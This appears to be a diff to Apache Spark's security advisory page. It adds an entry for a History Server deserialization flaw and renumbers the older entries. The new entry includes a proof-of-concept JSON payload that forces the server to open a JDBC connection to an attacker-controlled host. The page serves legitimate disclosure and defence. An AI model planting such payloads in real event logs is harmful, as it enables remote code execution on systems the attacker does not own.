@@ -121,41 +121,71 @@
 <ul>
 <li><a href="https://lists.apache.org/thread/zrgyy9l85nm2c7vk36vr7bkyorg3w4qq">https://lists.apache.org/thread/zrgyy9l85nm2c7vk36vr7bkyorg3w4qq</a></li>
 </ul>
+<h2 id="CVE-2025-54920">Spark History Server Code Execution Vulnerability</h2>
+<p>CVE-2025-54920 <a href="https://cve.org/CVERecord?id=CVE-2025-54920">[CVE]</a> <a href="./CVE-2025-54920.cve.json">[CVE json]</a> <a href="./CVE-2025-54920.osv.json">[OSV json]</a></p>
+<p><em>Last updated: 2026-03-14T09:01:48.596Z</em></p>
+<h3 id="affected-1">Affected</h3>
+<ul>
+<li>Apache Spark before 3.5.7</li>
+<li>Apache Spark from 4.0.0 before 4.0.1</li>
+</ul>
+<h3 id="description-1">Description</h3>
+<p></p><p></p><p>This issue affects Apache Spark: before 3.5.7 and 4.0.1. Users are recommended to upgrade to version 3.5.7 or 4.0.1 and above, which fixes the issue.<br><br></p><p></p><p><b>Summary</b></p><p>Apache Spark 3.5.4 and earlier versions contain a code execution vulnerability in the Spark History Web UI due to overly permissive Jackson deserialization of event log data. This allows an attacker with access to the Spark event logs directory to inject malicious JSON payloads that trigger deserialization of arbitrary classes, enabling command execution on the host running the Spark History Server.<br></p><p><b><br></b></p><p><b>Details</b></p><p>The vulnerability arises because the Spark History Server uses Jackson polymorphic deserialization with <code>@JsonTypeInfo.Id.CLASS</code> on <code>SparkListenerEvent</code> objects, allowing an attacker to specify arbitrary class names in the event JSON. This behavior permits instantiating unintended classes, such as <code>org.apache.hive.jdbc.HiveConnection</code>, which can perform network calls or other malicious actions during deserialization.</p>
+<p>The attacker can exploit this by injecting crafted JSON content into the Spark event log files, which the History Server then deserializes on startup or when loading event logs. For example, the attacker can force the History Server to open a JDBC connection to a remote attacker-controlled server, demonstrating remote command injection capability.</p><br><p></p><p></p><p><strong>Proof of Concept:</strong></p>1. Run Spark with event logging enabled, writing to a writable directory (<code>spark-logs</code>).<p></p><p>2. Inject the following JSON at the beginning of an event log file:
+</p><pre><div><div>{</div><div><code>  "Event": "org.apache.hive.jdbc.HiveConnection",
+  "uri": "jdbc:hive2://&lt;IP&gt;:&lt;PORT&gt;/",
+  "info": {
+    "hive.metastore.uris": "thrift://&lt;IP&gt;:&lt;PORT&gt;"
+  }
+}</code></div></div></pre><p></p><p>3. Start the Spark History Server with logs pointing to the modified directory.</p><p>4. The Spark History Server initiates a JDBC connection to the attacker’s server, confirming the injection.<br></p>
+<p></p><p></p><p><strong><br></strong></p><p><strong>Impact</strong></p><p>An attacker with write access to Spark event logs can execute arbitrary code on the server running the History Server, potentially compromising the entire system.</p>
+<p></p><br>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/apache/spark/pull/51312">https://github.com/apache/spark/pull/51312</a></li>
+<li><a href="https://github.com/apache/spark/pull/51323">https://github.com/apache/spark/pull/51323</a></li>
+<li><a href="https://issues.apache.org/jira/browse/SPARK-52381">https://issues.apache.org/jira/browse/SPARK-52381</a></li>
+<li><a href="https://lists.apache.org/thread/4y9n0nfj7m68o2hpmoxgc0y7dm1lo02s">https://lists.apache.org/thread/4y9n0nfj7m68o2hpmoxgc0y7dm1lo02s</a></li>
+</ul>
+<h3 id="credits">Credits</h3>
+<ul>
+<li>Alexandre Pujol (Linagora) (finder)</li>
+</ul>
 <h2 id="CVE-2023-32007">Shell command injection via Spark UI</h2>
 <p>CVE-2023-32007 <a href="https://cve.org/CVERecord?id=CVE-2023-32007">[CVE]</a> <a href="./CVE-2023-32007.cve.json">[CVE json]</a> <a href="./CVE-2023-32007.osv.json">[OSV json]</a></p>
 <p><em>Last updated: 2023-05-02T08:37:02.283Z</em></p>
-<h3 id="affected-1">Affected</h3>
+<h3 id="affected-2">Affected</h3>
 <ul>
 <li>Apache Spark from 3.1.1 before 3.2.2</li>
 </ul>
-<h3 id="description-1">Description</h3>
+<h3 id="description-2">Description</h3>
 <div>** UNSUPPORTED WHEN ASSIGNED ** The Apache Spark UI offers the possibility to enable ACLs via the configuration option spark.acls.enable. With an authentication filter, this checks whether a user has access permissions to view or modify the application. If ACLs are enabled, a code path in HttpSecurityFilter can allow someone to perform impersonation by providing an arbitrary user name. A malicious user might then be able to reach a permission check function that will ultimately build a Unix shell command based on their input, and execute it. This will result in arbitrary shell command execution as the user Spark is currently running as. This issue was disclosed earlier as CVE-2022-33891, but incorrectly claimed version 3.1.3 (which has since gone EOL) would not be affected.</div><div>NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</div><div>Users are recommended to upgrade to a supported version of Apache Spark, such as version 3.4.0.<br></div>
-<h3 id="references-1">References</h3>
+<h3 id="references-2">References</h3>
 <ul>
 <li><a href="https://www.cve.org/CVERecord?id=CVE-2022-33891">https://www.cve.org/CVERecord?id=CVE-2022-33891</a></li>
 <li><a href="https://spark.apache.org/security.html">https://spark.apache.org/security.html</a></li>
 <li><a href="https://lists.apache.org/thread/poxgnxhhnzz735kr1wos366l5vdbb0nv">https://lists.apache.org/thread/poxgnxhhnzz735kr1wos366l5vdbb0nv</a></li>
 </ul>
-<h3 id="credits">Credits</h3>
+<h3 id="credits-1">Credits</h3>
 <ul>
 <li>Sven Krewitt, Flashpoint (reporter)</li>
 </ul>
 <h2 id="CVE-2023-22946">Apache Spark proxy-user privilege escalation from malicious configuration class</h2>
 <p>CVE-2023-22946 <a href="https://cve.org/CVERecord?id=CVE-2023-22946">[CVE]</a> <a href="./CVE-2023-22946.cve.json">[CVE json]</a> <a href="./CVE-2023-22946.osv.json">[OSV json]</a></p>
 <p><em>Last updated: 2023-04-17T07:30:17.426Z</em></p>
-<h3 id="affected-2">Affected</h3>
+<h3 id="affected-3">Affected</h3>
 <ul>
 <li>Apache Spark before 3.4.0</li>
 </ul>
-<h3 id="description-2">Description</h3>
+<h3 id="description-3">Description</h3>
 <div>In Apache Spark versions prior to 3.4.0, applications using spark-submit can specify a 'proxy-user' to run as, limiting privileges. The application can execute code with the privileges of the submitting user, however, by providing malicious configuration-related classes on the classpath. This affects architectures relying on proxy-user, for example those using Apache Livy to manage submitted applications.</div><div>Update to Apache Spark 3.4.0 or later, and ensure that 
 spark.submit.proxyUser.allowCustomClasspathInClusterMode is set to its 
 default of "false", and is not overridden by submitted applications.<br></div>
-<h3 id="references-2">References</h3>
+<h3 id="references-3">References</h3>
 <ul>
 <li><a href="https://lists.apache.org/thread/yllfl25xh5tbotjmg93zrq4bzwhqc0gv">https://lists.apache.org/thread/yllfl25xh5tbotjmg93zrq4bzwhqc0gv</a></li>
 </ul>
-<h3 id="credits-1">Credits</h3>
+<h3 id="credits-2">Credits</h3>
 <ul>
 <li>Hideyuki Furue (finder)</li>
 <li>Yi Wu (Databricks) (remediation developer)</li>
@@ -163,54 +193,54 @@ default of "false", and is not overridden by submitted applications.<br></div>
 <h2 id="CVE-2022-33891">Apache Spark shell command injection vulnerability via Spark UI</h2>
 <p>CVE-2022-33891 <a href="https://cve.org/CVERecord?id=CVE-2022-33891">[CVE]</a> <a href="./CVE-2022-33891.cve.json">[CVE json]</a> <a href="./CVE-2022-33891.osv.json">[OSV json]</a></p>
 <p><em>Last updated: 2022-07-18T06:58:42.467Z</em></p>
-<h3 id="affected-3">Affected</h3>
+<h3 id="affected-4">Affected</h3>
 <ul>
 <li>Apache Spark from 3.0.3 and earlier through 3.0.3</li>
 <li>Apache Spark from 3.1.1 to 3.1.2 through 3.1.2</li>
 <li>Apache Spark from 3.2.0 to 3.2.1 through 3.2.1</li>
 </ul>
-<h3 id="description-3">Description</h3>
+<h3 id="description-4">Description</h3>
 <p>The Apache Spark UI offers the possibility to enable ACLs via the configuration option spark.acls.enable. With an authentication filter, this checks whether a user has access permissions to view or modify the application. If ACLs are enabled, a code path in HttpSecurityFilter can allow someone to perform impersonation by providing an arbitrary user name. A malicious user might then be able to reach a permission check function that will ultimately build a Unix shell command based on their input, and execute it. This will result in arbitrary shell command execution as the user Spark is currently running as. This affects Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1.</p>
-<h3 id="references-3">References</h3>
+<h3 id="references-4">References</h3>
 <ul>
 <li><a href="https://lists.apache.org/thread/p847l3kopoo5bjtmxrcwk21xp6tjxqlc">https://lists.apache.org/thread/p847l3kopoo5bjtmxrcwk21xp6tjxqlc</a></li>
 </ul>
-<h3 id="credits-2">Credits</h3>
+<h3 id="credits-3">Credits</h3>
 <ul>
 <li>Kostya Kortchinsky (Databricks)</li>
 </ul>
 <h2 id="CVE-2022-31777">Apache Spark XSS vulnerability in log viewer UI Javascript</h2>
 <p>CVE-2022-31777 <a href="https://cve.org/CVERecord?id=CVE-2022-31777">[CVE]</a> <a href="./CVE-2022-31777.cve.json">[CVE json]</a> <a href="./CVE-2022-31777.osv.json">[OSV json]</a></p>
 <p><em>Last updated: 2022-11-01T15:31:47.242Z</em></p>
-<h3 id="affected-4">Affected</h3>
+<h3 id="affected-5">Affected</h3>
 <ul>
 <li>Apache Spark at 3.3.0</li>
 <li>Apache Spark from 3.2.1 and earlier through 3.2.1</li>
 </ul>
-<h3 id="description-4">Description</h3>
+<h3 id="description-5">Description</h3>
 <p>A stored cross-site scripting (XSS) vulnerability in Apache Spark 3.2.1 and earlier, and 3.3.0, allows remote attackers to execute arbitrary JavaScript in the web browser of a user, by including a malicious payload into the logs which would be returned in logs rendered in the UI.</p>
-<h3 id="references-4">References</h3>
+<h3 id="references-5">References</h3>
 <ul>
 <li><a href="https://lists.apache.org/thread/60mgbswq2lsmrxykfxpqq13ztkm2ht6q">https://lists.apache.org/thread/60mgbswq2lsmrxykfxpqq13ztkm2ht6q</a></li>
 </ul>
-<h3 id="credits-3">Credits</h3>
+<h3 id="credits-4">Credits</h3>
 <ul>
 <li>Florian Walter (Veracode)</li>
 </ul>
 <h2 id="CVE-2021-38296">Apache Spark Key Negotiation Vulnerability</h2>
 <p>CVE-2021-38296 <a href="https://cve.org/CVERecord?id=CVE-2021-38296">[CVE]</a> <a href="./CVE-2021-38296.cve.json">[CVE json]</a> <a href="./CVE-2021-38296.osv.json">[OSV json]</a></p>
 <p><em>Last updated: 2022-03-10T08:16:48.042Z</em></p>
-<h3 id="affected-5">Affected</h3>
+<h3 id="affected-6">Affected</h3>
 <ul>
 <li>Apache Spark from up to and including version 3.1.2 through 3.1.2</li>
 </ul>
-<h3 id="description-5">Description</h3>
+<h3 id="description-6">Description</h3>
 <p>Apache Spark supports end-to-end encryption of RPC connections via &ldquo;spark.authenticate&rdquo; and &ldquo;spark.network.crypto.enabled&rdquo;. In versions 3.1.2 and earlier, it uses a bespoke mutual authentication protocol that allows for full encryption key recovery. After an initial interactive attack, this would allow someone to decrypt plaintext traffic offline. Note that this does not affect security mechanisms controlled by &ldquo;spark.authenticate.enableSaslEncryption&rdquo;, &ldquo;spark.io.encryption.enabled&rdquo;, &ldquo;spark.ssl&rdquo;, &ldquo;spark.ui.strictTransportSecurity&rdquo;.  Update to Apache Spark 3.1.3 or later</p>
-<h3 id="references-5">References</h3>
+<h3 id="references-6">References</h3>
 <ul>
 <li><a href="https://lists.apache.org/thread/70x8fw2gx3g9ty7yk0f2f1dlpqml2smd">https://lists.apache.org/thread/70x8fw2gx3g9ty7yk0f2f1dlpqml2smd</a></li>
 </ul>
-<h3 id="credits-4">Credits</h3>
+<h3 id="credits-5">Credits</h3>
 <ul>
 <li>Steve Weis (Databricks)</li>
 </ul>
